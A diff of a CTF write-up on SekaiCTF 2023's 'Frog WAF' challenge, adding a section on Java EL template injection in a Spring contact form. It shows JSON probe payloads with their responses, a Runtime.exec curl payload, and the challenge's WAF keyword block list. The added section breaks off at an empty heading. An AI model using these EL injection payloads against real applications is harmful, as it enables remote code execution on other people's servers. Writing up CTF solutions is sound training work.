@@ -121,16 +121,7 @@ There is a lot of files, so I won't go into details in everyone. Let's see some 
 
 **[Contact.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/Contact.java)**
 ```java
-package com.sekai.app.controller.contact;
-
-import lombok.Getter;
-import lombok.Setter;
-
-import javax.persistence.Entity;
-import javax.persistence.GeneratedValue;
-import javax.persistence.Id;
-import javax.validation.constraints.NotNull;
-import javax.validation.constraints.Pattern;
+// ... Java verbosities
 
 @Getter
 @Setter
@@ -166,18 +157,7 @@ public class Contact {
 
 **[CheckCountry.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CheckCountry.java)**
 ```java
-package com.sekai.app.controller.contact;
-
-
-import javax.validation.Constraint;
-import javax.validation.Payload;
-import java.lang.annotation.Documented;
-import java.lang.annotation.Repeatable;
-import java.lang.annotation.Retention;
-import java.lang.annotation.Target;
-
-import static java.lang.annotation.ElementType.*;
-import static java.lang.annotation.RetentionPolicy.RUNTIME;
+// ... Java verbosities
 
 @Target({FIELD, METHOD, PARAMETER, ANNOTATION_TYPE, TYPE_USE})
 @Retention(RUNTIME)
@@ -213,19 +193,7 @@ Which takes us to the last piece of important code for now.
 
 **[CountryValidator.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CountryValidator.java)**
 ```java
-package com.sekai.app.controller.contact;
-
-import com.sekai.app.waf.FrogWaf;
-import lombok.SneakyThrows;
-import lombok.val;
-import org.springframework.core.io.ClassPathResource;
-import org.springframework.util.StreamUtils;
-
-import javax.validation.ConstraintValidator;
-import javax.validation.ConstraintValidatorContext;
-import java.nio.charset.Charset;
-import java.nio.file.AccessDeniedException;
-import java.util.Arrays;
+// ... Java verbosities
 
 public class CountryValidator implements ConstraintValidator<CheckCountry, String> {
 
@@ -267,6 +235,166 @@ constraintContext.buildConstraintViolationWithTemplate(message).addConstraintVio
 ```
 The [buildConstraintViolationWithTemplate](https://docs.jboss.org/hibernate/stable/validator/api/org/hibernate/validator/constraintvalidation/HibernateConstraintValidatorContext.html#buildConstraintViolationWithTemplate(java.lang.String)) method processes Java EL. Since we can control part of the message variable, it is basically a [Template Injection](https://codeql.github.com/codeql-query-help/java/java-insecure-bean-validation/) for us.
 
+### Payload - The Basics
+
+To make it simpler, let's make some valid Payloads, except for the Country, which is our attack surface.
+
+I don't remember how we got that `message` was a variable interpreted in the EL.
+Let's test some payloads on `/addContact` route.
+
+- Payload
+```json
+{
+    "firstName":"Hey",
+    "lastName":"You",
+    "description":"Abc",
+    "country":"{message}"
+}
+```
+
+- Response:
+```json
+{
+    "violations": [
+        {
+            "fieldName": "country",
+            "message": "Invalid country is not a valid country"
+        }
+    ]
+}
+```
+
+`Invalid country` is the default return value of the [`message`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/42289630c7c3e803c40675e8463dbd17baed6e23/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CheckCountry.java#L21) method on the [CheckCountry.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/controller/contact/CheckCountry.java) interface.
+
+By using the dollar sign, we start to play better games using our `message` variable.
+
+- Payload
+```json
+{
+    "firstName":"Hey",
+    "lastName":"You",
+    "description":"Abc",
+    "country":"${message.getClass().toString()}"
+}
+```
+
+- Response:
+```json
+{
+    "violations": [
+        {
+            "fieldName": "country",
+            "message": "class java.lang.String is not a valid country"
+        }
+    ]
+}
+```
+
+Nice. So, let's just use [EL to get RCE](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language#rce) using the Runtime class, right?
+**W**ait **A** **F**reaking minute...
+
+### Code Analysis - WAF
+
+![](https://i.imgur.com/dW0aESI.png)
+
+Now is the time we arrive on the challenge name, which is the [WAF](https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/).
+Let's take a look at the WAF request Interceptor.
+
+[FrogWaf.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/waf/FrogWaf.java)
+```java
+// ... Java verbosities
+
+@Configuration
+@Order(Integer.MIN_VALUE)
+public class FrogWaf implements HandlerInterceptor {
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object obj) throws Exception {
+        // Uri
+        val query = request.getQueryString();
+        if (query != null) {
+            val v = getViolationByString(query);
+            if (v.isPresent()) {
+                throw new AccessDeniedException(String.format("Malicious input found: %s", v));
+            }
+        }
+        return true;
+    }
+
+    public static Optional<WafViolation> getViolationByString(String userInput) {
+        for (val c : AttackTypes.values()) {
+            for (val m : c.getAttackStrings()) {
+                if (userInput.contains(m)) {
+                    return Optional.of(new WafViolation(c, m));
+                }
+            }
+        }
+        return Optional.empty();
+    }
+
+}
+```
+
+**WAF Summary**
+
+The [`getViolationByString`](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/waf/FrogWaf.java#L29) function checks if a string contains a violation of the WAF.
+It is used when validating the Country.
+The `preHandle` function checks the queryString, but it is useless for solving the challenge.
+
+Let's check the WAF rules.
+
+[FrogWaf.java](https://github.com/Neptunians/sekai-ctf-2023-web-writeup/blob/main/web-frog-waf/source/src/main/java/com/sekai/app/waf/AttackTypes.java)
+```java
+// ... Java verbosities
+
+public enum AttackTypes {
+    SQLI("\"", "'", "#"),
+    XSS(">", "<"),
+    OS_INJECTION("bash", "&", "|", ";", "`", "~", "*"),
+    CODE_INJECTION("for", "while", "goto", "if"),
+    JAVA_INJECTION("Runtime", "class", "java", "Name", "char", "Process", "cmd", "eval", "Char", "true", "false"),
+    IDK("+", "-", "/", "*", "%", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+
+    @Getter
+    private final String[] attackStrings;
+
+    AttackTypes(String... attackStrings) {
+        this.attackStrings = attackStrings;
+    }
+
+}ally
+```
+
+**WAF Filters Summary**
+
+OK, now we got a really restrictive filter for a lot of kinds of attacks.
+Let's check our previous payload using some of the forbidden keywords.
+
+- **Payload**
+
+`${".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}`
+
+- **Response**
+
+`Malicious input found: Optional[WafViolation(attackType=SQLI, attackString=&quot;)]`
+
+Let's make it a little simpler:
+
+- **Payload**
+
+`${java.lang.Runtime}`
+
+- **Response**
+
+`Optional[WafViolation(attackType=JAVA_INJECTION, attackString=Runtime)]`
+
+Some words shall not be spoken.
+
+![](https://i.imgur.com/u6Y7CnU.png)
+
+### Hacking bit by bit
+
+
+
 ## Challenge: Chunky (16 solves)
 
 ![](https://i.imgur.com/yWbxMYQ.png)
@@ -275,5 +403,7 @@ The [buildConstraintViolationWithTemplate](https://docs.jboss.org/hibernate/stab
 * Team: [FireShell](https://fireshellsecurity.team/)
 * [Team Twitter](https://twitter.com/fireshellst)
 * Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks)
+* [Hacktricks - RCE with Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language#rce)
+* [WAF](https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/)
 * [Repo with artifacts discussed here](https://github.com/Neptunians/sekai-ctf-2023-web-writeup)
 * [Team Project Sekai](https://sekai.team/)
